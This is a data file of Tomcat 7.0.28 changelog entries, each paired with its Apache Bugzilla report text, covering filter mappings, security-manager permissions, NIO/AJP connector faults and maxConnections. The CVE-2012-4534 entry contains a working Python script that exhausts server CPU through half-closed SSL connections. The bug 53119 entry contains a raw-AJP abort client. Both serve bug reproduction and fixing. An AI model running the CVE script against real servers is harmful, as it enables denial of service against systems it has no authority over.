Catalina|Tomcat 7.0.28 (markt)|fix|53354|Correctly handle @WebFilter annotations that do not include a mapping. (markt)|<filter-mapping> doesn't find the @WebFilter(filterName)|"As it's not possible to specify the invocation order in a @WebFilter, users are forced to explicitly specify <filter-mapping> in web.xml. This works in combination with a @WebFilter(filterName) in Glassfish and JBoss AS as follows:

@WebFilter(filterName=""filter1"")
public class Filter1 implements Filter {}

@WebFilter(filterName=""filter2"")
public class Filter2 implements Filter {}

with

<filter-mapping>
    <filter-name>filter1</filter-name>
    <url-pattern>/url1/*</url-pattern>
</filter-mapping>
<filter-mapping>
    <filter-name>filter2</filter-name>
    <url-pattern>/url2/*</url-pattern>
</filter-mapping>

However it fails in Tomcat 7.0.27 with the following confusing exception (the <url-pattern> *is* been set)

Caused by: java.lang.IllegalArgumentException: Filter mapping must specify either a <url-pattern> or a <servlet-name>
	at org.apache.catalina.core.StandardContext.validateFilterMap(StandardContext.java:3009)
	at org.apache.catalina.core.StandardContext.addFilterMap(StandardContext.java:2968)
	at org.apache.catalina.deploy.WebXml.configureContext(WebXml.java:1207)
	at org.apache.catalina.startup.ContextConfig.webConfig(ContextConfig.java:1294)
	at org.apache.catalina.startup.ContextConfig.configureStart(ContextConfig.java:855)
	at org.apache.catalina.startup.ContextConfig.lifecycleEvent(ContextConfig.java:345)
	at org.apache.catalina.util.LifecycleSupport.fireLifecycleEvent(LifecycleSupport.java:119)
	at org.apache.catalina.util.LifecycleBase.fireLifecycleEvent(LifecycleBase.java:90)
	at org.apache.catalina.core.StandardContext.startInternal(StandardContext.java:5161)
	at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:150)
	... 7 more"|https://bz.apache.org/bugzilla/show_bug.cgi?id=53354
Catalina|Tomcat 7.0.28 (markt)|fix|53356|Add support for servlets mapped explicitly to the context root of a web application. (markt)|Mapping a servlet to the applicatio‚Äãn's context root results in IAE|"Created attachment 28881 [details]
test web app

Hi,
 
I have an application and I want to map my servlet to the application's context root, but I do not want to override the ""/"" mapping for the ""default"" servlet.
 
It is specified in the Servlet spec that there is a ""special"" url mapping that can be used for such purposes and it is an empty string ("""").
 
I tried several approaches to specify this via web.xml and annotation, unfortunately all of them results in IAE:

Caused by: java.lang.IllegalArgumentException: Invalid <url-pattern>  in servlet mapping
 at org.apache.catalina.core.StandardContext.addServletMapping(StandardContext.java:3208)
 at org.apache.catalina.core.StandardContext.addServletMapping(StandardContext.java:3183)
 at org.apache.catalina.deploy.WebXml.configureContext(WebXml.java:1302)
 at org.apache.catalina.startup.ContextConfig.webConfig(ContextConfig.java:1305)
 at org.apache.catalina.startup.ContextConfig.configureStart(ContextConfig.java:855)
 at org.apache.catalina.startup.ContextConfig.lifecycleEvent(ContextConfig.java:346)


The issue was started as mail thread in the users list - http://marc.info/?t=133883470600003&r=1&w=2


Can you please provide this feature?
Thanks in advance
Regards
Violeta

PP: test application is attached."|https://bz.apache.org/bugzilla/show_bug.cgi?id=53356
Catalina|Tomcat 7.0.28 (markt)|fix|53366|Ensure new HTTP header parser works correctly when running Tomcat under a security manager. (markt/kkolinko)|Running with SecurityManager: protected/index.jsp returns blank page when it is the first page accessed|"eproducible in 7.0.27 and in current 7.0.x.

To reproduce:
1. Start ""catalina.bat start -security""
2. Go to
[1] http://localhost:8080/examples/jsp/security/protected/index.jsp

3. Expected result: Display login form.
Actual result:
 Blank page. Access log shows:
127.0.0.1 - - [06/Jun/2012:04:35:23 +0400] ""GET /examples/jsp/security/protected/index.jsp HTTP/1.1"" 200 -

That is, response code is 200, count of bytes is '-'.


If I stay on [1] and keep refreshing it, the problem persists.

But if I visit [2], then [1] starts to work. I suspect that some class needs to be preloaded.

[2] http://localhost:8080/examples/"|https://bz.apache.org/bugzilla/show_bug.cgi?id=53366
Catalina|Tomcat 7.0.28 (markt)|fix|53368|Configure the default security policy to allow web applications to use WebSocket when running under a security manager. (markt/kkolinko)|Running with SecurityManager: WebSocket examples need accessClassInPackage permission|"WebSocket examples fail to work if Tomcat 7 is run with SecurityManager enabled.

They start to work correctly with the following change the policy file:

Index: catalina.policy
===================================================================
--- catalina.policy     (revision 1346679)
+++ catalina.policy     (working copy)
@@ -188,6 +188,7 @@

     // Applications using Comet need to be able to access this package
     permission java.lang.RuntimePermission ""accessClassInPackage.org.apache.catalina.comet"";
+    permission java.lang.RuntimePermission ""accessClassInPackage.org.apache.catalina.websocket"";
 };


Steps to reproduce:
1. Start ""catalina.bat start -security""

2. Go to ""Echo"" websocket example:
http://localhost:8080/examples/websocket/echo.html

3. Click ""(.) streams"", then click ""[Connect]"" button.

Expected: The following message in ""console"" area:
Info: WebSocket connection opened.

Actual: The following message is printed:
Info: WebSocket connection closed.


The following exception is written to catalina*.log:
[[[
06.06.2012 4:54:20 org.apache.catalina.loader.WebappClassLoader findClass
WARNING: WebappClassLoader.findClassInternal(websocket.echo.EchoStream) security exception: access denied (java.lang.RuntimePermission accessClassInPackage.org.apache.catalina.websocket)
java.security.AccessControlException: access denied (java.lang.RuntimePermission accessClassInPackage.org.apache.catalina.websocket)
	at java.security.AccessControlContext.checkPermission(AccessControlContext.java:374)
	at java.security.AccessController.checkPermission(AccessController.java:546)
	at java.lang.SecurityManager.checkPermission(SecurityManager.java:532)
	at java.lang.SecurityManager.checkPackageAccess(SecurityManager.java:1512)
	at java.lang.ClassLoader$1.run(ClassLoader.java:330)
	at java.security.AccessController.doPrivileged(Native Method)
	at java.lang.ClassLoader.checkPackageAccess(ClassLoader.java:328)
	at java.lang.ClassLoader.defineClass1(Native Method)
	at java.lang.ClassLoader.defineClassCond(ClassLoader.java:631)
	at java.lang.ClassLoader.defineClass(ClassLoader.java:615)
	at java.security.SecureClassLoader.defineClass(SecureClassLoader.java:141)
	at org.apache.catalina.loader.WebappClassLoader.findClassInternal(WebappClassLoader.java:2889)
	at org.apache.catalina.loader.WebappClassLoader.findClass(WebappClassLoader.java:1170)
	at org.apache.catalina.loader.WebappClassLoader.loadClass(WebappClassLoader.java:1678)
	at org.apache.catalina.loader.WebappClassLoader.loadClass(WebappClassLoader.java:1556)
	at org.apache.catalina.core.StandardWrapper.servletSecurityAnnotationScan(StandardWrapper.java:1215)
	at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:461)
	at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:168)
	at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:98)
	at org.apache.catalina.valves.AccessLogValve.invoke(AccessLogValve.java:927)
	at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:118)
	at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:407)
	at org.apache.coyote.http11.AbstractHttp11Processor.process(AbstractHttp11Processor.java:999)
	at org.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(AbstractProtocol.java:573)
	at org.apache.tomcat.util.net.JIoEndpoint$SocketProcessor.run(JIoEndpoint.java:310)
	at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908)
	at java.lang.Thread.run(Thread.java:662)
]]]"|https://bz.apache.org/bugzilla/show_bug.cgi?id=53368
Catalina|Tomcat 7.0.28 (markt)|fix|53373|Allow whitespace around delimiters in <Context> aliases for readability. (schultz)|Allow whitespace around delimiters in <Context> aliases for readability|"See bug 53359: Request for <Aliases> or <Alias> as element inside <Context>

<Context> aliases attribute should allow whitespace to surround both the "","" and ""="" delimiters. For example:

<Context aliases=""/EDSILabCatalog= c:/xampp/htdocs/cLabs/EDSILabCatalog,
                  /EDSILabs      = c:/xampp/htdocs/cLabs/EDSILabs,
                  /Global        = c:/xampp/htdocs/cLabs/Global,
                  /Skyline       = c:/xampp/htdocs/cLabs/Skyline,
                  /Sun           = c:/xampp/htdocs/cLabs/Sun,
                  /Sunset        = c:/xampp/htdocs/cLabs/Sunset,
                  /Tech2000      = c:/xampp/htdocs/cLabs/Tech2000""
	/>"|https://bz.apache.org/bugzilla/show_bug.cgi?id=53373
Coyote|Tomcat 7.0.28 (markt)|fix||52858, CVE-2012-4534: Correct fix for high CPU load. (fhanik)|High CPU load in the NIO connector, when a client breaks connection unexpectedly|"How to reproduce:
Tomcat with the NIO connector, using HTTPS scheme, when a client requests for
some quite a big (~100K-200K) static file, and breaks the connection
unexpectedly.
Here is the python script to reproduce the problem:

# The way to reproduce the bug in the Tomcat NIO connector.
# Install python-iptables from https://github.com/ldx/python-iptables/downloads
# Author: Dmitry Kukushkin (dmitry.kukushkin at external.telekom.de)
from threading import Thread
from threading import Lock
from socket import *
from select import *
from time import *
from traceback import *
import ssl
import sys
import iptc

blockedPorts = dict()

getCssRequest = """"""GET /<some big file> HTTP/1.1\r
Host: <host>:<port>\r
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 5_0_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Mobile/9A406\r
Accept: text/css,*/*;q=0.1\r
Accept-Language: de-de\r
Accept-Encoding: gzip, deflate\r
Connection: keep-alive\r\n
\r\n
""""""

class Client(Thread):
    def __init__(self, tid, lock):
        Thread.__init__(self)
        self.lock = lock
        self.tid = tid

    def run(self):
        print ""Starting thread %d"" % self.tid
        try:
            clientSocket = socket(AF_INET, SOCK_STREAM)
            sslSocket = ssl.wrap_socket(clientSocket)
            
            remoteAddr = (<host>, <port>)
            sslSocket.connect(remoteAddr)
            localAddr, localPort =  sslSocket.getsockname()
            print ""New socket created tid=%d, sfd=%d, sport=%d"" % ( self.tid, clientSocket.fileno(), localPort )
            self.deleteFirewallRule(localPort, self.lock)
            
            sslSocket.send(getCssRequest)
            data = sslSocket.recv(1024)
            ''' Put the socket into half - closed state '''
            clientSocket.shutdown(SHUT_WR)
            clientSocket.close()
            self.createFirewallRule(localPort, self.lock)
        except Exception, e:
           print ""Error: "", e
           print_exc()

    @staticmethod
    def createFirewallRule(port, lock):
        lock.acquire()
        print ""Creating the iptables rule for port %d"" % port
        rule = iptc.Rule()
        rule.protocol = ""tcp""
        rule.target = iptc.Target(rule, ""REJECT"")

        match = iptc.Match(rule, ""tcp"")
        match.sport = ""%s"" % port
        rule.add_match(match)
            
        chain = iptc.Chain(iptc.TABLE_FILTER, ""OUTPUT"")
        chain.insert_rule(rule)
        rule.target.reset()
        blockedPorts[port] = rule
        lock.release()
    
    @staticmethod
    def deleteFirewallRule(port, lock):
        lock.acquire()
        if port in blockedPorts:
            print ""Deleteng the iptables rule for port %d"" % port
            rule = blockedPorts[port]
            chain = iptc.Chain(iptc.TABLE_FILTER, ""OUTPUT"")
            chain.delete_rule(rule)
            chain.flush()
            del blockedPorts[port]
        lock.release()
        
if __name__ == ""__main__"":
    
    if len(sys.argv) == 1 :
        print ""Problem.py <number of threads>""
        exit(0)
    clients = []
    lock = Lock()
    for i in range( int(sys.argv[1]) ):
        c = Client(i, lock)
        clients.append(c)
        c.start()
        
    print ""Joining""
    for i in clients:
        i.join()

The client shutdowns the socket, thus making connection half-closed, and disappears (is blocked by firewall in case of this script). This results in a high CPU load:
Servers polls the socket descriptor for both reading and writing, and gets EPOLLIN event on this half-closed connection, then it is trying to write, failing with EAGAIN, polling sd for writing and reading events again, getting EPOLLIN, trying to write... and so on, as you can see from the attached strace snippet:
...
[pid 26206] epoll_ctl(50, EPOLL_CTL_DEL, 51, {0, {u32=51, u64=34359738419}}) = 0
[pid 26206] gettimeofday({1331211762, 650946}, NULL) = 0
[pid 26206] epoll_wait(50,  <unfinished ...>
[pid 26199] <... epoll_wait resumed> {{EPOLLIN, {u32=40, u64=7266968735074746408}}}, 4096, 1000) = 1
[pid 26199] read(40, ""\1"", 128)         = 1
[pid 26199] gettimeofday({1331211762, 652745}, NULL) = 0
[pid 26199] epoll_wait(43,  <unfinished ...>
[pid 26206] <... epoll_wait resumed> {{EPOLLIN, {u32=48, u64=6182845940760624}}}, 4096, 1000) = 1
[pid 26206] read(48, ""\1"", 128)         = 1
[pid 26206] gettimeofday({1331211762, 675214}, NULL) = 0
[pid 26206] gettimeofday({1331211762, 675294}, NULL) = 0
[pid 26206] gettimeofday({1331211762, 675378}, NULL) = 0
[pid 26206] epoll_ctl(50, EPOLL_CTL_ADD, 51, {EPOLLOUT, {u32=51, u64=51}}) = 0
[pid 26206] epoll_ctl(50, EPOLL_CTL_MOD, 51, {EPOLLIN|EPOLLOUT, {u32=51, u64=7255244058472218675}}) = 0
[pid 26206] gettimeofday({1331211762, 675570}, NULL) = 0
[pid 26206] epoll_wait(50, {{EPOLLIN, {u32=51, u64=7255244058472218675}}}, 4096, 1000) = 1
[pid 26206] gettimeofday({1331211762, 675699}, NULL) = 0
[pid 26206] gettimeofday({1331211762, 675761}, NULL) = 0
[pid 26206] write(51, ""\272\270\301c\226\341\272o-<\233\370|\223\313\241\177\215*\236\201\327YI5u\210J*A\371z""..., 116) = -1 EAGAIN (Resource temporarily unavailable)
[pid 26206] gettimeofday({1331211762, 675925}, NULL) = 0
[pid 26206] gettimeofday({1331211762, 675979}, NULL) = 0
[pid 26206] epoll_wait(50, {{EPOLLIN, {u32=51, u64=7255244058472218675}}}, 4096, 1000) = 1
[pid 26206] gettimeofday({1331211762, 676082}, NULL) = 0
[pid 26206] gettimeofday({1331211762, 676144}, NULL) = 0
[pid 26206] write(51, ""\272\270\301c\226\341\272o-<\233\370|\223\313\241\177\215*\236\201\327YI5u\210J*A\371z""..., 116) = -1 EAGAIN (Resource temporarily unavailable)
[pid 26206] gettimeofday({1331211762, 676273}, NULL) = 0
[pid 26206] gettimeofday({1331211762, 676327}, NULL) = 0
[pid 26206] epoll_wait(50, {{EPOLLIN, {u32=51, u64=7255244058472218675}}}, 4096, 1000) = 1
[pid 26206] gettimeofday({1331211762, 676429}, NULL) = 0
[pid 26206] gettimeofday({1331211762, 676476}, NULL) = 0
[pid 26206] write(51, ""\272\270\301c\226\341\272o-<\233\370|\223\313\241\177\215*\236\201\327YI5u\210J*A\371z""..., 116) = -1 EAGAIN (Resource temporarily unavailable)
[pid 26206] gettimeofday({1331211762, 676609}, NULL) = 0
[pid 26206] gettimeofday({1331211762, 676671}, NULL) = 0
...

Possible solution:
Check if EPOLLOUT event has arrived before attempting to send the file:
--- apache-tomcat-7.0.26-src/java/org/apache/tomcat/util/net/NioEndpoint.java
+++ apache-tomcat-7.0.26-src/java/org/apache/tomcat/util/net/NioEndpoint.java
@@ -1205,7 +1205,7 @@
                     sk.attach(attachment);//cant remember why this is here
                     NioChannel channel = attachment.getChannel();
                     if (sk.isReadable() || sk.isWritable() ) {
-                        if ( attachment.getSendfileData() != null ) {
+                        if ( sk.isWritable() && attachment.getSendfileData() != null ) {
                             processSendfile(sk,attachment,true, false);
                         } else if ( attachment.getComet() ) {
                             //check if thread is available"|https://bz.apache.org/bugzilla/show_bug.cgi?id=52858
Coyote|Tomcat 7.0.28 (markt)|fix|53138|Broken Sendfile on SSL introduced in 7.0.27 (fhanik)|Not able to download a file size of 740KB using NIO connector in tomcat version 7.0.27. But with the same configuration I was able to download that in tomcat 7.0.26.|"We have an application that uses a java script file of size around 700Kb that will be downloaded as part of the client. The connector used was NIO . All these days we did not see any issue till Tomcat 7.0.26.
 
When we upgraded it to the latest Tomcat version 7.0.27 we started getting this problem. The file is never getting downloaded the connection will be broken in middle. 

And we used fiddler to see what is happening and it gives us a message as below

‚ÄúContent-Length mismatch: Response Header indicated 757,692 bytes, but server sent 262,142 bytes.‚Äù

If I use the default connector there is no issues. it works fine. 

To reproduce this we have created a sample application. Please follow the steps below.

Clean up all the browser cash: 
1.	Deploy  TestNIOConnector app in tomcat.
2.	In server.xml change to connect to NIO as shown below.
<Connector port=""9880"" protocol=""org.apache.coyote.http11.Http11NioProtocol"" maxThreads=""150"" connectionTimeout=""70000""
  acceptCount=""100"" compression=""on"" acceptorThreadCount=""2"" redirectPort=""8443"" />
3.	Start the service and try to access this file using the following URL in IE.
http://localhost:9880/TestNIOConnector/apidocs.js"|https://bz.apache.org/bugzilla/show_bug.cgi?id=53138
Coyote|Tomcat 7.0.28 (markt)|fix|52055|Additional fix required to ensure that InputFilters are recycled between requests. (markt)|ChunkedInputFilter is not recycled for servlet 3.0 asynchronous request|"I'm using the standard servlet 3.0 async APIs with tomcat 7.0.22. The server side code is something like the following:

        final AsyncContext asyncContext = request.startAsync();

        ... // in a processing thread
        asyncContext.getRequest().getInputStream();
        ... read the input stream
        asyncContext.complete();

The InputStream returns 0 bytes for the HTTP post with chunking. 

After debugging, I found that the ChunkedInputFilter is reused by org.apache.coyote.http11.AbstractInputBuffer. But it has never been recycled (nextRequest()?) before the reuse for another request. As a result, the endChunk flag is always true after the first request. And it always return immediately without reading more from the buffer."|https://bz.apache.org/bugzilla/show_bug.cgi?id=52055
Coyote|Tomcat 7.0.28 (markt)|fix|53061|Fix a problem in the NIO connector whereby if the poller was under low but consistent load (>1 request/per second and always less than 1 second between requests) timeouts never took place. (markt)|tomcat asynchronous invocation problem|"Created attachment 28581 [details]
a simple test reproducing the problem

We encountered a problem during asynchronous operations (tomcat7 with servlet 3). 
Description:  
One client continuously sends post requests to the server. On the server side for each request created AsyncContext with timeout 20 seconds:
AsyncContext asyncContext = req.startAsync(req, resp);
      asyncContext.setTimeout(20000);
As expected after approximately 20 sec the requests are completed. Then another client also begins to send requests to the server but in this case they are explicitly completed after 500 milliseconds. Something like this:
AsyncContext asyncContext = req.startAsync(req, resp);
      asyncContext.setTimeout(20000);      
      try {
         Thread.sleep(500);
      } catch (Exception e) {
      }

      asyncContext.complete();

The problem is that after running the second client all requests that are waiting for timeout (from the first client) are stuck and not released (onTimeout method of AsyncEvent is not called) until the second client stops sending requests.
It looks like the problem occurs on Linux but not on Windows.

I attached a simple test that may help to reproduce this issue. The following servlet accepts URL parameter ‚Äúcomplete‚Äù.
When ‚Äúcomplete=1‚Äù the request will be completed after 500ms.
Otherwise the request will wait till timeout (20 seconds).
Run client that periodically sends requests to /servlet?complete=0. (I have tested it with 10 parallel threads that run in a loop)
Then run another client that periodically sends requests to /servlet?complete=1 (This client can use only a single thread)
See that the first client does not receive any responses while the second client is running."|https://bz.apache.org/bugzilla/show_bug.cgi?id=53061
Coyote|Tomcat 7.0.28 (markt)|fix|53063|When using an Executor with BIO, use the executor's maxThreads as the default for maxConnections. (markt)|Inconsistency in documentation regarding Connector's maxConnections property|"According to the documentation, the ""maxConnections"" property of a BIO HTTP Connector defaults to the value of ""maxThreads"".

Additionally, the documentation states that if the ""executor"" property is specified, any thread related properties on the Connector will be ignored.  This includes ""maxThreads"".

However, when a BIO HTTP Connector is defined with an executor, the default value for ""maxConnections"" does not take the ""maxThreads"" value from the Executor.  In fact, it appears to take the ""maxThreads"" value from the Connector object, which is supposed to be ignored.

https://tomcat.apache.org/tomcat-7.0-doc/config/http.html#Standard_Implementation


This can be confirmed with the following test.

1.) Download Tomcat 7.0.27.
2.) Edit ""conf/server.xml"", uncomment the ""tomcatThreadPool"" executor, comment out the default HTTP connector and uncomment the HTTP connector below it that uses the executor.
3.) Start Tomcat and connect with jconsole
4.) Look at the Catalina -> ProtocolHandler -> 8080 -> maxConnections.  It will be set to 200 and not 150 (maxThreads on the executor).
5.) Now, stop Tomcat, edit ""conf/server.xml"", add a ""maxThreads"" attribute to the connector, set the value to 300 and start tomcat.
6.) Examine the Catalina -> ProtocolHandler -> 8080 -> maxConnections property again and it'll be set to 300.


Suggestions:

1.) Update the documentation to indicate that ""maxConnections"" for a BIO HTTP Connector defaults to ""maxThreads"" on the Connector, regardless of the presence of an executor.

2.) Fix the ""maxConnections"" default so that it takes its value from ""maxThreads"" on the executor, when an executor is specified.

My preferences would be for #2."|https://bz.apache.org/bugzilla/show_bug.cgi?id=53063
Coyote|Tomcat 7.0.28 (markt)|fix|53119|Prevent buffer overflow errors being reported when a client disconnects before the response has been fully written from an AJP connection using the APR/native connector. (markt)|java.nio.BufferOverflowException in AjpAprProcessor.output() when AJP client disconnects|"As reported on the users list [2] (note that I used Tomcat 7.0.27, but Bugzilla seems to have only 7.0.26):

Hi all,

some time ago, I wrote about a BufferOverflowException which I got sporadically on my Tomcat 7.0.21 [1], when using the AJP-APR-Connector.
However, at that time I couldn't reproduce the exception.

When I looked at this again today, I was able to create a client that sends an AJP message and aborts the connection, resulting in the BufferOverflowException in Tomcat. I was using Tomcat 7.0.27 with Tomcat Native 1.1.23, on Oracle JDK 1.7.0_03 and Windows 7 32-bit.


To reproduce,

1. On the server side, create a web application containing a servlet which will generate some random data:

@WebServlet(""/index.html"")
public class MyTestServlet extends HttpServlet {
    private static final long serialVersionUID = 1L;
       
    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        try {
            response.setContentType(""text/plain"");
            response.setCharacterEncoding(""utf-8"");
            
            byte[] bytesToWrite = {48, 49, 50, 51, 52, 53, 54, 55, 56, 57};
            
            // Try to write 1,000,000 bytes to the client.
            try (OutputStream out = response.getOutputStream()) {
                for (int i = 0; i < 100000; i++) {
                    out.write(bytesToWrite);
                }
            }
            
        } catch (IOException ex) {
            // Ignore
        }
    }
}

Deploy the application as ROOT, so that the servlet will be reachable at ""/"".
Configure Tomcat to have an AJP-APR connector listening on port 8009.


2. On the client side, create a program like this:

public class AjpTester {
    public static void main(String[] args) throws IOException {

        byte[] ajpPacketBytes = { // JK_AJP13_FORWARD_REQUEST for ""/""
            0x12, 0x34, 0x00, 0x54, 0x02, 0x02, 0x00, 0x08,
            0x48, 0x54, 0x54, 0x50, 0x2f, 0x31, 0x2e, 0x31,
            0x00, 0x00, 0x01, 0x2f, 0x00, 0x00, 0x07, 0x31,
            0x2e, 0x32, 0x2e, 0x33, 0x2e, 0x34, 0x00, 0x00,
            0x07, 0x31, 0x2e, 0x32, 0x2e, 0x33, 0x2e, 0x34,
            0x00, 0x00, 0x09, 0x6c, 0x6f, 0x63, 0x61, 0x6c,
            0x68, 0x6f, 0x73, 0x74, 0x00, 0x00, 0x50, 0x00,
            0x00, 0x02, (byte)0xa0, 0x06, 0x00, 0x0a, 0x4b, 0x65,
            0x65, 0x70, 0x2d, 0x41, 0x6c, 0x69, 0x76, 0x65,
            0x00, (byte)0xa0, 0x0b, 0x00, 0x09, 0x6c, 0x6f, 0x63,
            0x61, 0x6c, 0x68, 0x6f, 0x73, 0x74, 0x00, (byte)0xff
        };

        Socket s = new Socket(""localhost"", 8009); // connect to AJP port
        OutputStream sout = s.getOutputStream();
        InputStream sin = s.getInputStream();

        sout.write(ajpPacketBytes); // request Url ""/""

        // Read between 10,000 and 11,023 bytes, then exit the JVM
        byte[] buf = new byte[1024];
        int read;
        int bytesRead = 0;
        while ((read = sin.read(buf)) > 0) {
            bytesRead += read;
            if (bytesRead >= 10000) {
                System.exit(1);
            }
        }
    }
}

The client will send an JK_AJP13_FORWARD_REQUEST message which requests URL ""/"" and sends ""Connection: keep-alive"" and ""Host: localhost"" headers.


3. Tomcat will display this exception:

Apr 20, 2012 10:57:08 PM org.apache.coyote.ajp.AjpAprProcessor process
Schwerwiegend: Error processing request
java.nio.BufferOverflowException
	at java.nio.DirectByteBuffer.put(DirectByteBuffer.java:357)
	at org.apache.coyote.ajp.AjpAprProcessor.output(AjpAprProcessor.java:285)
	at org.apache.coyote.ajp.AbstractAjpProcessor$SocketOutputBuffer.doWrite(AbstractAjpProcessor.java:1119)
	at org.apache.coyote.Response.doWrite(Response.java:504)
	at org.apache.catalina.connector.OutputBuffer.realWriteBytes(OutputBuffer.java:383)
	at org.apache.tomcat.util.buf.ByteChunk.flushBuffer(ByteChunk.java:462)
	at org.apache.catalina.connector.OutputBuffer.doFlush(OutputBuffer.java:334)
	at org.apache.catalina.connector.OutputBuffer.close(OutputBuffer.java:283)
	at org.apache.catalina.connector.Response.finishResponse(Response.java:511)
	at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:434)
	at org.apache.coyote.ajp.AjpAprProcessor.process(AjpAprProcessor.java:197)
	at org.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(AbstractProtocol.java:565)
	at org.apache.tomcat.util.net.AprEndpoint$SocketProcessor.run(AprEndpoint.java:1812)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1110)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:603)
	at java.lang.Thread.run(Thread.java:722)


I guess the exception itself is harmless, but it may fill up log files, if clients disconnect frequently while receiving data.
Note that before that exception occurs, a regular ""ClientAbortException:  java.io.IOException: Failed to send AJP message"" is thrown by org.apache.catalina.connector.OutputBuffer.realWriteBytes(OutputBuffer.java:388).
The exception occurs neither with AJP-BIO nor with AJP-NIO.


[1] http://markmail.org/message/zogi3tfbz2kyw3jg
[2] http://markmail.org/message/ntejdw36pfhlqodr"|https://bz.apache.org/bugzilla/show_bug.cgi?id=53119
Coyote|Tomcat 7.0.28 (markt)|add|53169|Allow developers to avoid chunked encoding for a response of unknown length by setting the Connection: close header. Based on a patch suggested by Philippe Marschall. (markt)|[patch] don't do chunking with Connection: close|"Created attachment 28702 [details]
patch against trunk

The attached patch disables chunking on if there is a Connection: close header, we're on HTTP 1.1 and there's no Content-Length header.

This helps to implement Server-Sent Events [1]. Server-Sent Event are conceptually similar to the forever streaming iframe in the sense that there's an ""infinite"" response from the server that always gets updated. But they're easier to use and with less issues. They are also easier to use than WebSockets if you don't need a back channel.

The specification reccoments to disable chunking. Jetty implements the same behavior, when there's a Connection: close header it doesn't do chunking.

The following discussion [2] leads me to believe that patches would be welcome. The patch comes with unit tests that verify that there is still chunking happending when there is no Connection: close header.

 [1] http://dev.w3.org/html5/eventsource/#notes
 [2] http://tomcat.10.n6.nabble.com/How-to-disable-chunked-encoding-for-the-Http11NioProtocol-connector-td2038448.html"|https://bz.apache.org/bugzilla/show_bug.cgi?id=53169
Coyote|Tomcat 7.0.28 (markt)|fix|53173|Properly count down maxConnections (fhanik)|maxConnections feature hangs the system|"Created attachment 28704 [details]
fix missing count down for maxConnections latch

We've run into a scenario where the JIO Acceptor thread hangs as connections are not counted down properly.

<Executor name=""tomcatThreadPool"" 
          namePrefix=""tomcat-8080-"" 
          minSpareThreads=""50"" 
          maxThreads=""300""/>

<Connector port=""8080"" 
           redirectPort=""${bio.https.port}""              
           protocol=""org.apache.coyote.http11.Http11Protocol""
           maxKeepAliveRequests=""15"" 
           executor=""tomcatThreadPool"" 
           connectionTimeout=""20000"" 
           acceptCount=""100""/>

Thread dump yields
""http-bio-8080-Acceptor-0"" daemon prio=3 tid=0xXXXXXXXX nid=0xXX waiting on condition [0xXXXXXXXX..0xXXXXXXXX]
   java.lang.Thread.State: WAITING (parking)
	at sun.misc.Unsafe.park(Native Method)
	- parking to wait for  <0xXXXXXXXX> (a org.apache.tomcat.util.threads.LimitLatch$Sync)
	at java.util.concurrent.locks.LockSupport.park(LockSupport.java:158)
	at java.util.concurrent.locks.AbstractQueuedSynchronizer.parkAndCheckInterrupt(AbstractQueuedSynchronizer.java:747)
	at java.util.concurrent.locks.AbstractQueuedSynchronizer.doAcquireSharedInterruptibly(AbstractQueuedSynchronizer.java:905)
	at java.util.concurrent.locks.AbstractQueuedSynchronizer.acquireSharedInterruptibly(AbstractQueuedSynchronizer.java:1217)
	at org.apache.tomcat.util.threads.LimitLatch.countUpOrAwait(LimitLatch.java:99)
	at org.apache.tomcat.util.net.AbstractEndpoint.countUpOrAwaitConnection(AbstractEndpoint.java:660)
	at org.apache.tomcat.util.net.JIoEndpoint$Acceptor.run(JIoEndpoint.java:210)
	at java.lang.Thread.run(Thread.java:619)

This, as you may imagine, is a fairly hard use case to reproduce into a simple test case. The easiest way to reproduce it is to create the following configuration
    <Executor name=""tomcatThreadPool"" 
              namePrefix=""catalina-exec-""
              maxThreads=""5"" 
              minSpareThreads=""0"" 
              maxQueueSize=""15""/>
<Connector port=""8080"" 
           protocol=""HTTP/1.1"" executor=""tomcatThreadPool""
           connectionTimeout=""10000""
           redirectPort=""8443"" 
           maxConnections=""30""/>

This reproduces one test case, where the state machine is not taking into account that connections may be rejected by the queue, but it doesn't count down the latch.
I'm attaching a patch to fix this specific use case, but it may not be a complete fix. As a workaround, the patch also introduces the maxConnections=""-1"" configuration that disables the usage of maxConnections. The -1 setting is important to give administrator a workaround while the other edge cases are tracked down.


I have not been able to reproduce this error with NIO connector.

There is one more place in the JioEndpoint that requires handling of RejectedExecutionException in the 
public boolean processSocketAsync(SocketWrapper<Socket> socket,SocketStatus status) 
This is currently unhandled."|https://bz.apache.org/bugzilla/show_bug.cgi?id=53173
Coyote|Tomcat 7.0.28 (markt)|update||Update default value of pollerThreadCount for the NIO connector. The new default value will never go above 2 regardless of available processors. (fhanik)|||
Coyote|Tomcat 7.0.28 (markt)|add||Allow to retrieve the current connectionCount via getter from the endpoint and as JMX attribute of the ThreadPool mbean. (rjung)|||
Coyote|Tomcat 7.0.28 (markt)|fix||Correct an edge case where Comet END events were not send to connected clients when the Tomcat connector was stopped. (markt)|||
Coyote|Tomcat 7.0.28 (markt)|fix|53406|Fix possible stack overflow on connection close when using Comet. (fhanik)|Stack overflow in connector|"found against trunk on Jun 18, 2012

SEVERE:
java.lang.StackOverflowError
        at org.apache.catalina.core.StandardContextValve.event(StandardContextValve.java:128)
        at org.apache.catalina.valves.ValveBase.event(ValveBase.java:204)
        at org.apache.catalina.core.StandardHostValve.event(StandardHostValve.java:223)
        at org.apache.catalina.valves.ValveBase.event(ValveBase.java:204)
        at org.apache.catalina.valves.ValveBase.event(ValveBase.java:204)
        at org.apache.catalina.core.StandardEngineValve.event(StandardEngineValve.java:110)
        at org.apache.catalina.connector.CoyoteAdapter.event(CoyoteAdapter.java:209)
